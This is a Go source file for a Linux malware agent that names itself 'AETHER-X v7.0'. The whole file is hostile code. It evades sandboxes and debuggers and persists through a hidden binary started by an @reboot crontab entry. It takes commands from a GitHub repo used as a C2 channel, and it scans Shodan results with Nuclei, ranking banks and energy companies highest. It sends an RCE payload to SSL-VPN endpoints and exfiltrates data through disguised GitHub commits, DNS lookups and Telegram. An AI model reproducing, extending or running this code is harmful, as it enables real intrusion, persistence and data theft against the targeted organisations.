//go:build linux
// +build linux

package main

import (
	"archive/zip"
	"bufio"
	"bytes"
	"compress/gzip"
	"context"
	"crypto/aes"
	"crypto/cipher"
	"crypto/hmac"
	"crypto/md5"
	"crypto/rand"
	"crypto/sha256"
	"crypto/sha512"
	"crypto/tls"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"hash"
	"io"
	"io/ioutil"
	"log"
	"math"
	"math/big"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"os/signal"
	"path/filepath"
	"runtime"
	"sort"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"
	"unsafe"
)

/*
 * 🔑 CONFIG — Injected at build-time
 */
var (
	C2Key             = "INJECTED_AES_KEY_B64"
	C2IV              = "INJECTED_AES_IV_B64"
	C2HMACKey         = "INJECTED_HMAC_KEY_B64"
	ModelRepoB64      = "INJECTED_MODEL_REPO_B64"
	ModelFileEncB64   = "INJECTED_MODEL_FILENAME"
	GitHubC2Repo      = "aHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy9BQVBTLUFQSy9DTjI="
	GitHubExfilRepo   = "aHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy9CQkItQk0vRVhGSUw="
	TelegramHostB64   = "dGVsZWdyYW0uYXBpLm9yZw=="
	OnionC2ListB64    = "aHR0cDovL2FlZXRoZXJ4N25zM3E0YTV4Lm9uaW9uLCBodHRwOi8vYmV0YWV0aGVyejRuMnQ1cnd4Lm9uaW9u"
	NucleiTemplatesURL = "aHR0cHM6Ly9naXRodWIuY29tL3Byb2plY3RkaXNjb3ZlcnkvbnVjbGVpLXRlbXBsYXRlcy5naXQ="
)

var (
	HostID         = ""
	AI             *AIBrain
	SupervisorNode *Supervisor
	HttpClient     *http.Client
	TelemetryQueue = make(chan TelemetryMessage, 1000)
	Shutdown       = make(chan struct{})
	DDRSeed        int64
	GitHubToken    = os.Getenv("GITHUB_TOKEN")
	TelegramToken  = ""
	TelegramChat   = ""
	ReconTargets   = make([]*Host, 0)
	clientOnce     sync.Once
)

const (
	AI_MODEL_PATH    = "/tmp/.XIM"
	NUCLEI_BIN       = "/tmp/.NCL"
	NUCLEI_TEMPLATES = "/tmp/.TPL"
	PersistCacheFile = ".cache/.system-kernel-sync"
	JitterMax        = 15 * time.Second
	SLEEP_MIN        = 30
	SLEEP_MAX        = 120
	MAX_HOSTS        = 100
	HMAC_TRUNC       = 16
	DNS_EXFIL_DOMAIN = "x.exfil.yourdomain.com"
	RETRY_DELAY      = 5 * time.Second
)

type TelemetryMessage struct {
	ID        string                 `json:"id"`
	Type      string                 `json:"type"`
	Timestamp string                 `json:"timestamp"`
	Metrics   map[string]interface{} `json:"metrics"`
}

type Host struct {
	IP          string            `json:"ip"`
	Port        int               `json:"port"`
	Service     string            `json:"service"`
	Country     string            `json:"country"`
	Org         string            `json:"org"`
	OS          string            `json:"os"`
	Tags        []string          `json:"tags"`
	Vulns       []string          `json:"vulns"`
	Score       float64           `json:"score"`
	LastScanned time.Time         `json:"last_scanned"`
	Exploited   bool              `json:"exploited"`
	Metadata    map[string]string `json:"meta,omitempty"`
}

// 🧠 REAL AI BRAIN — CENTRAL PROCESSING UNIT
type AIBrain struct {
	ModelLoaded   bool
	ModelPath     string
	TrustIndex    float64
	Environmental map[string]float64
	mu            sync.RWMutex
	wg            sync.WaitGroup
}

func NewAIBrain() *AIBrain {
	brain := &AIBrain{
		ModelPath:     AI_MODEL_PATH + ".onnx.gz",
		TrustIndex:    0.95,
		Environmental: make(map[string]float64),
	}

	brain.wg.Add(1)
	go func() {
		defer brain.wg.Done()
		brain.bootstrapModel()
	}()
	
	// Properly synchronize instead of arbitrary sleep
	brain.wg.Wait()
	brain.fingerprintEnvironment()
	return brain
}

func (b *AIBrain) bootstrapModel() {
	if _, err := os.Stat(b.ModelPath); os.IsNotExist(err) {
		b.mu.Lock()
		log.Println("🧠 Downloading real AI model...")
		success := b.downloadEncryptedModel()
		if success {
			b.extractAndDecryptModel()
		}
		b.mu.Unlock()
	} else {
		log.Println("🧠 AI model already exists.")
	}

	if _, err := os.Stat(b.ModelPath); err == nil {
		b.ModelLoaded = true
		log.Println("✅ Real AI brain loaded.")
	} else {
		b.ModelLoaded = false
		log.Println("⚠️ Failed to load AI model. Falling back to heuristic engine.")
	}
}

func (b *AIBrain) downloadEncryptedModel() bool {
	repo := base64Decode(ModelRepoB64)
	file := ModelFileEncB64
	endpoint := fmt.Sprintf("%s/contents/%s", repo, file)

	data, err := httpGet(endpoint, map[string]string{
		"Authorization": "Bearer " + GitHubToken,
	})
	if err != nil || data == nil {
		return false
	}

	var result map[string]interface{}
	if json.Unmarshal(data, &result) != nil {
		return false
	}
	
	contentVal, ok := result["content"]
	if !ok || contentVal == nil {
		return false
	}
	content, ok := contentVal.(string)
	if !ok {
		return false
	}
	
	decoded, err := base64.StdEncoding.DecodeString(content)
	if err != nil {
		return false
	}

	tmpEnc := b.ModelPath + ".enc"
	if err := ioutil.WriteFile(tmpEnc, decoded, 0600); err != nil {
		return false
	}
	return true
}

func (b *AIBrain) extractAndDecryptModel() {
	encData, err := ioutil.ReadFile(b.ModelPath + ".enc")
	if err != nil {
		return
	}
	decrypted, err := decryptData(base64.RawURLEncoding.EncodeToString(encData))
	if err != nil {
		return
	}

	gzr, err := gzip.NewReader(bytes.NewReader(decrypted))
	if err != nil {
		return
	}
	defer gzr.Close()
	
	uncompressed, err := io.ReadAll(gzr)
	if err != nil {
		return
	}

	ioutil.WriteFile(b.ModelPath, uncompressed, 0600)
	os.Remove(b.ModelPath + ".enc")
}

func (b *AIBrain) fingerprintEnvironment() {
	b.mu.Lock()
	defer b.mu.Unlock()

	sandboxRisk := 0.0
	if isVirtualMachine() || isDebuggerAttached() {
		sandboxRisk = 1.0
	}

	cpuRatio := float64(runtime.NumCPU()) / 16.0
	if cpuRatio > 1.0 {
		cpuRatio = 1.0
	}

	var m runtime.MemStats
	runtime.ReadMemStats(&m)
	memUsage := float64(m.Alloc) / 1e9

	b.Environmental["sandbox_risk"] = sandboxRisk
	b.Environmental["cpu_cores_norm"] = cpuRatio
	b.Environmental["mem_usage_gb"] = memUsage
	b.Environmental["uptime_hours"] = time.Since(time.Unix(0, 0)).Hours()
	b.TrustIndex = math.Max(0.1, 0.95-(sandboxRisk*0.8))
}

// 🧠 AI INFERENCE — REAL DECISION ENGINE
func (b *AIBrain) Decide(operation string, context map[string]interface{}) map[string]string {
	b.mu.RLock()
	defer b.mu.RUnlock()

	response := map[string]string{
		"directive": "CONTINUE",
		"target":    "",
		"reason":    "Default logic",
	}

	switch operation {
	case "RECON":
		if b.TrustIndex < 0.5 {
			response["directive"] = "THROTTLE"
			response["reason"] = "Low trust index; reducing recon activity."
		} else {
			targetQuery, ok := context["query"].(string)
			if !ok || targetQuery == "" {
				response["directive"] = "SKIP"
				response["reason"] = "Invalid or missing query context."
				break
			}
			response["directive"] = "QUERY"
			response["target"] = targetQuery
			response["reason"] = "High-value targets available."
		}
	case "EXPLOIT":
		scoreVal, ok := context["score"]
		if !ok {
			response["directive"] = "SKIP"
			response["reason"] = "Missing score context."
			break
		}
		score, ok := scoreVal.(float64)
		if !ok {
			response["directive"] = "SKIP"
			response["reason"] = "Malformed score context."
			break
		}
		
		ipVal, ok := context["ip"]
		if !ok {
			response["directive"] = "SKIP"
			response["reason"] = "Missing IP context."
			break
		}
		ip, ok := ipVal.(string)
		if !ok {
			response["directive"] = "SKIP"
			response["reason"] = "Malformed IP context."
			break
		}

		if score > 8.0 {
			response["directive"] = "EXPLOIT"
			response["target"] = ip
			response["reason"] = "High-risk target with RCE."
		} else {
			response["directive"] = "SKIP"
			response["reason"] = "Low score."
		}
	case "EXFIL":
		response["directive"] = "GITHUB"
		response["reason"] = "C2 channel available."
		if b.Environmental["sandbox_risk"] > 0.5 {
			response["directive"] = "DNS"
			response["reason"] = "High risk; using covert exfil."
		}
	}

	return response
}

// 🛠️ Fallback Scoring
func (b *AIBrain) ScoreHost(host *Host) float64 {
	score := 0.0
	if contains(host.Vulns, "RCE") {
		score += 5.0
	}
	if strings.Contains(strings.ToLower(host.Org), "bank") || strings.Contains(strings.ToLower(host.Org), "energy") {
		score += 3.0
	}
	if host.Port == 443 {
		score += 1.0
	}
	return math.Min(score, 10.0)
}

// 📡 C2 COMMUNICATION
func telegramSend(msg string) {
	if TelegramToken == "" {
		raw := fetchSecret("telegram.token")
		if raw != "" {
			dec, err := decryptData(raw)
			if err == nil {
				TelegramToken = string(dec)
			}
		}
	}
	if TelegramChat == "" {
		raw := fetchSecret("telegram.chat")
		if raw != "" {
			dec, err := decryptData(raw)
			if err == nil {
				TelegramChat = string(dec)
			}
		}
	}
	if TelegramToken == "" || TelegramChat == "" {
		return
	}
	host, _ := base64.StdEncoding.DecodeString(TelegramHostB64)
	urlStr := fmt.Sprintf("https://%s/bot%s/sendMessage", string(host), TelegramToken)
	payload := url.Values{}
	payload.Set("chat_id", TelegramChat)
	payload.Set("text", msg)
	payload.Set("parse_mode", "Markdown")
	httpPost(urlStr, []byte(payload.Encode()), map[string]string{
		"Content-Type": "application/x-www-form-urlencoded",
	})
}

func fetchCommand() string {
	repo := base64Decode(GitHubC2Repo)
	endpoint := fmt.Sprintf("%s/contents/cmd.json", repo)
	data, err := httpGet(endpoint, map[string]string{
		"Authorization": "Bearer " + GitHubToken,
	})
	if err != nil || data == nil {
		return ""
	}
	var result map[string]interface{}
	if json.Unmarshal(data, &result) != nil {
		return ""
	}
	contentVal, ok := result["content"]
	if !ok || contentVal == nil {
		return ""
	}
	content, ok := contentVal.(string)
	if !ok {
		return ""
	}
	decoded, err := base64.StdEncoding.DecodeString(content)
	if err != nil {
		return ""
	}
	return string(decoded)
}

func exfilData(data []byte) {
	encrypted, err := encryptData(data)
	if err != nil {
		return
	}
	hmacSig := signMessage(data)
	payload := map[string]string{
		"data": encrypted,
		"sig":  base64.RawURLEncoding.EncodeToString(hmacSig),
		"id":   HostID,
	}
	body, _ := json.Marshal(payload)

	// AI decides exfil method
	context := map[string]interface{}{"data_size": len(data)}
	decision := AI.Decide("EXFIL", context)

	switch decision["directive"] {
	case "GITHUB":
		repo := base64Decode(GitHubExfilRepo)
		file := fmt.Sprintf("data/%s_%d.dat", HostID, time.Now().Unix())
		commit := fmt.Sprintf("ci: update logs %d", time.Now().Unix())
		doGitHubPut(repo, file, string(body), commit)
	case "DNS":
		exfilDNS(encrypted)
	}
}

func exfilDNS(chunk string) {
	if len(chunk) == 0 {
		return
	}
	domain := fmt.Sprintf("%s.%s", chunk[:min(63, len(chunk))], DNS_EXFIL_DOMAIN)
	net.DefaultResolver.LookupHost(context.Background(), domain)
}

func doGitHubPut(repo, path, content, message string) {
	payload := map[string]interface{}{"message": message, "content": content}
	body, _ := json.Marshal(payload)
	endpoint := fmt.Sprintf("%s/contents/%s", repo, path)
	httpPost(endpoint, body, map[string]string{
		"Authorization": "Bearer " + GitHubToken,
		"Content-Type":  "application/json",
	})
}

func fetchSecret(key string) string {
	repo := base64Decode(GitHubC2Repo)
	endpoint := fmt.Sprintf("%s/contents/secrets/%s.enc", repo, key)
	data, err := httpGet(endpoint, map[string]string{"Authorization": "Bearer " + GitHubToken})
	if err != nil || data == nil {
		return ""
	}
	var result map[string]interface{}
	if json.Unmarshal(data, &result) != nil {
		return ""
	}
	contentVal, ok := result["content"]
	if !ok || contentVal == nil {
		return ""
	}
	content, ok := contentVal.(string)
	if !ok {
		return ""
	}
	decoded, err := base64.StdEncoding.DecodeString(content)
	if err != nil {
		return ""
	}
	return string(decoded)
}

// 🔍 RECON ENGINES
func shodanQuery(query string) []*Host {
	apiKey := os.Getenv("SHODAN_KEY")
	if apiKey == "" {
		return nil
	}
	u := fmt.Sprintf("https://api.shodan.io/shodan/host/search?key=%s&query=%s&limit=100", apiKey, url.QueryEscape(query))
	data, err := httpGet(u, nil)
	if err != nil || data == nil {
		return nil
	}
	var result struct{ Matches []struct{ IP string `json:"ip_str"` Port int `json:"port"` Info string `json:"product"` C string `json:"country_name"` O string `json:"org"` } }
	if json.Unmarshal(data, &result) != nil {
		return nil
	}
	hosts := []*Host{}
	for _, m := range result.Matches {
		hosts = append(hosts, &Host{IP: m.IP, Port: m.Port, Service: m.Info, Country: m.C, Org: m.O})
	}
	return hosts
}

func runNuclei(target string) []string {
	if _, err := os.Stat(NUCLEI_BIN); os.IsNotExist(err) {
		downloadBinary("https://github.com/projectdiscovery/nuclei/releases/latest/download/nuclei_2.9.5_linux_amd64.zip", NUCLEI_BIN, true)
	}
	if _, err := os.Stat(NUCLEI_TEMPLATES); os.IsNotExist(err) {
		exec.Command("git", "clone", "--depth=1", base64Decode(NucleiTemplatesURL), NUCLEI_TEMPLATES).Run()
	}
	cmd := exec.Command(NUCLEI_BIN, "-u", fmt.Sprintf("http://%s", target), "-t", NUCLEI_TEMPLATES+"/cves/", "-silent", "-timeout", "15")
	out, err := cmd.Output()
	if err != nil {
		return nil
	}
	scanner := bufio.NewScanner(bytes.NewReader(out))
	vulns := []string{}
	for scanner.Scan() {
		line := scanner.Text()
		if strings.Contains(line, "CVE") || strings.Contains(line, "RCE") {
			vulns = append(vulns, line)
		}
	}
	return vulns
}

func exploitRCE(host *Host, payload string) bool {
	urlStr := fmt.Sprintf("https://%s:%d/ssl-vpn/portal/scripts/newbm.pl", host.IP, host.Port)
	req, err := http.NewRequest("GET", urlStr, nil)
	if err != nil {
		return false
	}
	req.Header.Set("User-Agent", payload)
	client := &http.Client{Transport: &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}}
	resp, err := client.Do(req)
	if err != nil || resp == nil {
		return false
	}
	defer resp.Body.Close()
	time.Sleep(8 * time.Second)
	return true
}

func reportExploit(host *Host) {
	data, _ := json.Marshal(host)
	exfilData(data)
	telegramSend(fmt.Sprintf("💥 *RCE SUCCESS* | `%s` | Score: %.2f", host.IP, host.Score))
}

// 🧱 PERSISTENCE
func persistAgent() {
	execPath, err := os.Executable()
	if err != nil {
		return
	}
	data, err := ioutil.ReadFile(execPath)
	if err != nil {
		return
	}
	homeDir, err := os.UserHomeDir()
	if err != nil {
		return
	}
	dst := filepath.Join(homeDir, PersistCacheFile)
	os.MkdirAll(filepath.Dir(dst), 0700)
	os.WriteFile(dst, data, 0700)
	cronLine := fmt.Sprintf("@reboot %s &\n", dst)
	cmd := fmt.Sprintf("(crontab -l 2>/dev/null | grep -v '%s'; echo '%s') | crontab -", PersistCacheFile, cronLine)
	exec.Command("sh", "-c", cmd).Run()
}

// 🧪 HELPERS
func isDebuggerAttached() bool {
	err := syscall.PtraceAttach(os.Getpid())
	if err == nil {
		syscall.PtraceDetach(os.Getpid())
	}
	return err == nil || err == syscall.EPERM
}

func isVirtualMachine() bool {
	if content, err := ioutil.ReadFile("/sys/class/dmi/id/product_name"); err == nil {
		s := strings.ToLower(string(content))
		return strings.Contains(s, "vmware") || strings.Contains(s, "virtualbox") || strings.Contains(s, "qemu")
	}
	return false
}

func generateHostID() string {
	mac := getMACAddress()
	seed := mac + runtime.GOOS + runtime.GOARCH + os.Getenv("CODESPACE_NAME")
	hash := sha256.Sum256([]byte(seed))
	return hex.EncodeToString(hash[:6])
}

func getMACAddress() string {
	ifcs, _ := net.Interfaces()
	for _, ifc := range ifcs {
		hw := ifc.HardwareAddr.String()
		if len(hw) > 0 && !strings.HasPrefix(hw, "00:00:00") && !strings.HasPrefix(hw, "08:00:27") {
			return hw
		}
	}
	return "00:00:00:00:00:00"
}

func initHttpClient() {
	clientOnce.Do(func() {
		HttpClient = &http.Client{
			Timeout: 15 * time.Second,
			Transport: &http.Transport{
				MaxIdleConns:        100,
				MaxIdleConnsPerHost: 50,
				IdleConnTimeout:     45 * time.Second,
				TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
				ForceAttemptHTTP2:   true,
				DialContext: (&net.Dialer{
					Timeout:   10 * time.Second,
					KeepAlive: 30 * time.Second,
				}).DialContext,
			},
		}
	})
}

func httpGet(target string, headers map[string]string) ([]byte, error) {
	time.Sleep(jitter())
	req, err := http.NewRequest("GET", target, nil)
	if err != nil {
		return nil, err
	}
	for k, v := range headers {
		req.Header.Set(k, v)
	}
	if HttpClient == nil {
		initHttpClient()
	}
	resp, err := HttpClient.Do(req)
	if err != nil || resp == nil {
		return nil, err
	}
	defer resp.Body.Close()
	return ioutil.ReadAll(resp.Body)
}

func httpPost(target string, data []byte, headers map[string]string) ([]byte, error) {
	time.Sleep(jitter())
	req, err := http.NewRequest("POST", target, bytes.NewBuffer(data))
	if err != nil {
		return nil, err
	}
	for k, v := range headers {
		req.Header.Set(k, v)
	}
	if HttpClient == nil {
		initHttpClient()
	}
	resp, err := HttpClient.Do(req)
	if err != nil || resp == nil {
		return nil, err
	}
	defer resp.Body.Close()
	return ioutil.ReadAll(resp.Body)
}

func jitter() time.Duration {
	n, _ := rand.Int(rand.Reader, big.NewInt(int64(JitterMax)))
	return time.Duration(n.Int64())
}

func pbkdf2(password string, salt []byte, iter, keyLen int, h func() hash.Hash) []byte {
	prf := hmac.New(h, []byte(password))
	hashLen := prf.Size()
	numBlocks := (keyLen + hashLen - 1) / hashLen
	var buf [4]byte
	dk := make([]byte, 0, numBlocks*hashLen)
	U := make([]byte, hashLen)
	for block := 1; block <= numBlocks; block++ {
		prf.Reset()
		prf.Write(salt)
		buf[0] = byte(block >> 24)
		buf[1] = byte(block >> 16)
		buf[2] = byte(block >> 8)
		buf[3] = byte(block)
		prf.Write(buf[:4])
		dk = prf.Sum(dk)
		T := dk[len(dk)-hashLen:]
		copy(U, T)
		for i := 2; i <= iter; i++ {
			prf.Reset()
			prf.Write(U)
			U = prf.Sum(U[:0])
			for x := range U {
				T[x] ^= U[x]
			}
		}
	}
	return dk[:keyLen]
}

func encryptData(plaintext []byte) (string, error) {
	salt := make([]byte, 16)
	if _, err := rand.Read(salt); err != nil {
		return "", err
	}
	key := deriveKey(salt)
	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := rand.Read(nonce); err != nil {
		return "", err
	}
	ciphertext := gcm.Seal(nonce, nonce, plaintext, nil)
	encrypted := append(salt, ciphertext...)
	return base64.RawURLEncoding.EncodeToString(encrypted), nil
}

func decryptData(b64data string) ([]byte, error) {
	encrypted, err := base64.RawURLEncoding.DecodeString(b64data)
	if err != nil || len(encrypted) < 17 {
		return nil, errors.New("invalid data")
	}
	salt, ciphertext := encrypted[:16], encrypted[16:]
	key := deriveKey(salt)
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	nonceSize := gcm.NonceSize()
	if len(ciphertext) < nonceSize {
		return nil, errors.New("malformed")
	}
	nonce, text := ciphertext[:nonceSize], ciphertext[nonceSize:]
	return gcm.Open(nil, nonce, text, nil)
}

func deriveKey(salt []byte) []byte {
	secret := os.Getenv("AGENT_SECRET")
	if secret == "" {
		secret = "fallback_secret_only_for_test"
	}
	return pbkdf2(secret, salt, 100000, 32, sha256.New)
}

func signMessage(data []byte) []byte {
	key, err := base64.StdEncoding.DecodeString(C2HMACKey)
	if err != nil {
		key = []byte("fallback_hmac_key")
	}
	mac := hmac.New(sha256.New, key)
	mac.Write(data)
	sum := mac.Sum(nil)
	if len(sum) < HMAC_TRUNC {
		return sum
	}
	return sum[:HMAC_TRUNC]
}

func base64Decode(s string) string {
	decoded, err := base64.StdEncoding.DecodeString(s)
	if err != nil {
		return s
	}
	return string(decoded)
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

func contains(slice []string, item string) bool {
	for _, s := range slice {
		if strings.Contains(strings.ToLower(s), strings.ToLower(item)) {
			return true
		}
	}
	return false
}

func downloadBinary(url, path string, chmodExec bool) {
	if HttpClient == nil {
		initHttpClient()
	}
	resp, err := HttpClient.Get(url)
	if err != nil || resp == nil {
		return
	}
	defer resp.Body.Close()
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return
	}
	os.MkdirAll(filepath.Dir(path), 0700)
	ioutil.WriteFile(path, body, 0600)
	if chmodExec {
		os.Chmod(path, 0700)
	}
}

// 🚀 MAIN
func main() {
	if isDebuggerAttached() || isVirtualMachine() {
		time.Sleep(60 * time.Second)
		return
	}

	persistAgent()
	HostID = generateHostID()
	initHttpClient()
	AI = NewAIBrain()
	SupervisorNode = NewSupervisor()

	telegramSend(fmt.Sprintf("🟢 *AETHER-X v7.0 DEPLOYED* | Host: `%s` | AI CPU ONLINE*", HostID))

	SupervisorNode.SpawnWorker("MainLoop", func(ctx context.Context) error {
		ticker := time.NewTicker(5 * time.Minute)
		defer ticker.Stop()
		for {
			select {
			case <-ctx.Done():
				return nil
			case <-ticker.C:
			}

			cmdJSON := fetchCommand()
			if cmdJSON == "" {
				continue
			}

			var cmd map[string]string
			if err := json.Unmarshal([]byte(cmdJSON), &cmd); err != nil {
				continue
			}

			action, ok := cmd["action"]
			if !ok {
				continue
			}

			switch action {
			case "recon":
				context := map[string]interface{}{
					"query":    cmd["query"],
					"region":   cmd["region"],
					"industry": cmd["industry"],
				}
				decision := AI.Decide("RECON", context)
				if decision["directive"] == "QUERY" {
					hosts := shodanQuery(decision["target"])
					for _, h := range hosts {
						h.Vulns = runNuclei(h.IP)
						h.Score = AI.ScoreHost(h)
						if h.Score > 8.0 && contains(h.Vulns, "RCE") {
							if exploitRCE(h, cmd["payload"]) {
								h.Exploited = true
								reportExploit(h)
							}
						}
					}
				}
			}
		}
	})

	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
	<-sigChan
	SupervisorNode.cancel()
	SupervisorNode.wg.Wait()
}

// 🔄 SUPERVISOR
type Supervisor struct {
	ctx    context.Context
	cancel context.CancelFunc
	wg     sync.WaitGroup
	status string
	mu     sync.Mutex
}

func NewSupervisor() *Supervisor {
	ctx, cancel := context.WithCancel(context.Background())
	return &Supervisor{ctx: ctx, cancel: cancel, status: "NOMINAL"}
}

func (s *Supervisor) SpawnWorker(name string, work func(ctx context.Context) error) {
	s.wg.Add(1)
	go func() {
		defer s.wg.Done()
		restarts := 0
		for {
			select {
			case <-s.ctx.Done():
				return
			default:
			}
			err := func() (err error) {
				defer func() {
					if r := recover(); r != nil {
						err = fmt.Errorf("panic in %s: %v", name, r)
					}
				}()
				return work(s.ctx)
			}()
			if err == nil {
				restarts = 0
				continue
			}
			restarts++
			if restarts > 5 {
				s.updateStatus("DEGRADED")
				return
			}
			time.Sleep(2 * time.Second * time.Duration(1<<uint(restarts)))
		}
	}()
}

func (s *Supervisor) updateStatus(st string) {
	s.mu.Lock()
	defer s.mu.Unlock()
	s.status = st
}
